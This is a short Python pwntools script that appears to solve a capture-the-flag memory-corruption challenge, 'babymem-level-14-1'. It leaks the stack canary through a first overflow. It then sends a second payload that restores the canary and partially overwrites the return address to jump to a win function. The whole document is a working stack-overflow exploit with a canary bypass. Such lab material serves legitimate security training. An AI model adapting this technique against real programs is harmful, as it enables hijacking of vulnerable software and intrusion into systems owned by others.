
from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/babymem-level-14-1")

WIN = p16(0x147f)

buff_distance = 304
ret_distance = buff_distance + 8
canary_distance = ret_distance - 16
PADDING = b'A'*(24-6) + b"B"
PAYLOAD = b'REPEAT' + PADDING # -6
i = 0

io = elf.process()
io.sendline(f"{len(PAYLOAD)}")
io.send(PAYLOAD)
io.recvuntil("AAAAAAAB")
CANARY = u64(io.recvuntil("\n")[:-1].rjust(8, b"\x00"))
print(hex(CANARY))
PAYLOAD = b'A'*canary_distance + p64(CANARY) + p64(0xffffffffffffffff) + WIN
#print(io.recvuntil("\n")[:-1])
io.sendline(f"{len(PAYLOAD)}")
io.send(PAYLOAD)
res = io.recvall().decode()
if "pwn" in res:
    print(res)